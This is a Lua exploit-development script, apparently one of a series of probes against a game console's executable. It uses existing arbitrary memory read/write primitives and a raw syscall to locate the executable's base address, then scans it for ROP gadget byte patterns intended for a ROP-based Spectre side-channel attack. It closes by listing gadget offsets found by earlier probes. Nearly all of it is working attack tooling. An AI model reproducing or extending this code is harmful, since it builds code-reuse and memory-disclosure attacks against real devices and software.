-- CRASH_CLASS: LOW
-- PROBE 1199h: Scan eboot for memory-read gadgets needed for ROP-based Spectre
--
-- 1199g proved clock_gettime from Lua is ~20μs resolution (100x too slow).
-- For ROP-based Spectre we need native-speed gadgets:
-- - mov rax, [rdi]; ret  — read memory
-- - mov rax, [rsi]; ret  — read from second arg
-- - mov eax, [rdi]; ret  — 32-bit read
-- Also useful: xchg, cmov, load+store combos

print("=== PROBE 1199h: Memory-read gadgets for ROP Spectre ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

-- Get eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
print(string.format("eboot base: 0x%X%08X", text_hi, text_lo))

local SCAN_SIZE = 2 * 1024 * 1024
local MAX_PER = 6

local gadgets = {}
local function add(name, off)
    if not gadgets[name] then gadgets[name] = {} end
    if #gadgets[name] < MAX_PER then
        table.insert(gadgets[name], off)
        print(string.format("  FOUND %s at +0x%X", name, off))
    end
end

print("")
print("--- Scanning 2MB for read gadgets ---")

for off = 0, SCAN_SIZE - 8, 4 do
    local addr = eboot_base + uint64(off)
    local dw1 = safe_rd(addr)
    local dw2 = safe_rd(addr + uint64(4))
    if dw1 and dw2 then
        local b = {}
        b[0] = dw1 % 256
        b[1] = math.floor(dw1 / 256) % 256
        b[2] = math.floor(dw1 / 65536) % 256
        b[3] = math.floor(dw1 / 16777216) % 256
        b[4] = dw2 % 256
        b[5] = math.floor(dw2 / 256) % 256
        b[6] = math.floor(dw2 / 65536) % 256
        b[7] = math.floor(dw2 / 16777216) % 256

        for i = 0, 4 do
            -- 64-bit reads with REX.W (48 prefix)
            if b[i] == 0x48 and i <= 4 then
                -- mov rax, [rdi]; ret = 48 8B 07 C3
                if b[i+1] == 0x8B and b[i+2] == 0x07 and b[i+3] == 0xC3 then
                    add("mov rax,[rdi];ret", off + i)
                end
                -- mov rax, [rsi]; ret = 48 8B 06 C3
                if b[i+1] == 0x8B and b[i+2] == 0x06 and b[i+3] == 0xC3 then
                    add("mov rax,[rsi];ret", off + i)
                end
                -- mov rax, [rcx]; ret = 48 8B 01 C3
                if b[i+1] == 0x8B and b[i+2] == 0x01 and b[i+3] == 0xC3 then
                    add("mov rax,[rcx];ret", off + i)
                end
                -- mov rax, [rdx]; ret = 48 8B 02 C3
                if b[i+1] == 0x8B and b[i+2] == 0x02 and b[i+3] == 0xC3 then
                    add("mov rax,[rdx];ret", off + i)
                end
                -- mov rdi, [rdi]; ret = 48 8B 3F C3 (pointer chase)
                if b[i+1] == 0x8B and b[i+2] == 0x3F and b[i+3] == 0xC3 then
                    add("mov rdi,[rdi];ret", off + i)
                end
                -- mov rcx, [rdi]; ret = 48 8B 0F C3
                if b[i+1] == 0x8B and b[i+2] == 0x0F and b[i+3] == 0xC3 then
                    add("mov rcx,[rdi];ret", off + i)
                end
                -- mov rdx, [rdi]; ret = 48 8B 17 C3
                if b[i+1] == 0x8B and b[i+2] == 0x17 and b[i+3] == 0xC3 then
                    add("mov rdx,[rdi];ret", off + i)
                end
                -- mov rsi, [rdi]; ret = 48 8B 37 C3
                if b[i+1] == 0x8B and b[i+2] == 0x37 and b[i+3] == 0xC3 then
                    add("mov rsi,[rdi];ret", off + i)
                end
                -- mov rax, [rax]; ret = 48 8B 00 C3
                if b[i+1] == 0x8B and b[i+2] == 0x00 and b[i+3] == 0xC3 then
                    add("mov rax,[rax];ret", off + i)
                end
                -- mov [rsi], rax; ret = 48 89 06 C3
                if b[i+1] == 0x89 and b[i+2] == 0x06 and b[i+3] == 0xC3 then
                    add("mov [rsi],rax;ret", off + i)
                end
                -- mov [rdx], rax; ret = 48 89 02 C3
                if b[i+1] == 0x89 and b[i+2] == 0x02 and b[i+3] == 0xC3 then
                    add("mov [rdx],rax;ret", off + i)
                end
                -- add rax, rdi; ret = 48 01 F8 C3
                if b[i+1] == 0x01 and b[i+2] == 0xF8 and b[i+3] == 0xC3 then
                    add("add rax,rdi;ret", off + i)
                end
                -- xor rax, rax; ret = 48 31 C0 C3
                if b[i+1] == 0x31 and b[i+2] == 0xC0 and b[i+3] == 0xC3 then
                    add("xor rax,rax;ret", off + i)
                end
                -- shl rax, cl; ret = 48 D3 E0 C3
                if b[i+1] == 0xD3 and b[i+2] == 0xE0 and b[i+3] == 0xC3 then
                    add("shl rax,cl;ret", off + i)
                end
                -- and rax, rdi; ret = 48 21 F8 C3
                if b[i+1] == 0x21 and b[i+2] == 0xF8 and b[i+3] == 0xC3 then
                    add("and rax,rdi;ret", off + i)
                end
            end

            -- 32-bit reads (no REX prefix)
            -- mov eax, [rdi]; ret = 8B 07 C3
            if b[i] == 0x8B and b[i+1] == 0x07 and b[i+2] == 0xC3 then
                add("mov eax,[rdi];ret", off + i)
            end
            -- mov eax, [rsi]; ret = 8B 06 C3
            if b[i] == 0x8B and b[i+1] == 0x06 and b[i+2] == 0xC3 then
                add("mov eax,[rsi];ret", off + i)
            end
            -- mov eax, [rax]; ret = 8B 00 C3
            if b[i] == 0x8B and b[i+1] == 0x00 and b[i+2] == 0xC3 then
                add("mov eax,[rax];ret", off + i)
            end

            -- Multiply/shift for Spectre array indexing
            -- shl eax, 0xC; ret = C1 E0 0C C3 (shift by 12 = *4096 for page index)
            if b[i] == 0xC1 and b[i+1] == 0xE0 and b[i+2] == 0x0C and b[i+3] == 0xC3 then
                add("shl eax,12;ret", off + i)
            end
            -- shl rax, 0xC; ret = 48 C1 E0 0C C3
            if b[i] == 0x48 and b[i+1] == 0xC1 and b[i+2] == 0xE0 and b[i+3] == 0x0C then
                if i <= 3 and b[i+4] == 0xC3 then
                    add("shl rax,12;ret", off + i)
                end
            end

            -- xchg rax, rdi; ret = 48 87 F8 C3 or 48 97 C3
            if b[i] == 0x48 and b[i+1] == 0x97 and b[i+2] == 0xC3 then
                add("xchg rax,rdi;ret", off + i)
            end
            if b[i] == 0x48 and b[i+1] == 0x87 and b[i+2] == 0xF8 and b[i+3] == 0xC3 then
                add("xchg rax,rdi;ret", off + i)
            end
        end
    end

    if off % (512 * 1024) == 0 and off > 0 then
        print(string.format("  ... %dK / %dK", off / 1024, SCAN_SIZE / 1024))
    end
end

-- Summary
print("")
print("=== GADGET SUMMARY ===")
local names = {}
for name, _ in pairs(gadgets) do table.insert(names, name) end
table.sort(names)
for _, name in ipairs(names) do
    local list = gadgets[name]
    local offs = {}
    for _, o in ipairs(list) do table.insert(offs, string.format("+0x%X", o)) end
    print(string.format("  %s: %s", name, table.concat(offs, ", ")))
end

-- Already known gadgets for reference
print("")
print("=== KNOWN GADGETS (from prior probes) ===")
print("  pop rax;ret         +0x992")
print("  pop rdi;ret         +0xC9DFE")
print("  pop rsi;ret         +0xD77D")
print("  pop rdx;ret         +0x3B02D7")
print("  pop rcx;ret         +0xE64")
print("  pop r8;ret          +0x991")
print("  pop rdi;rbp;ret     +0x169")
print("  pop rsi;rbp;ret     +0x78")
print("  bare ret            +0x42")
print("  mov [rdi],rax;ret   +0x92C67")
print("  or rax,rdx;ret      +0xD6C0C")
print("  syscall             via libkernel fn_addr")

print("")
print("=== PROBE 1199h COMPLETE ===")
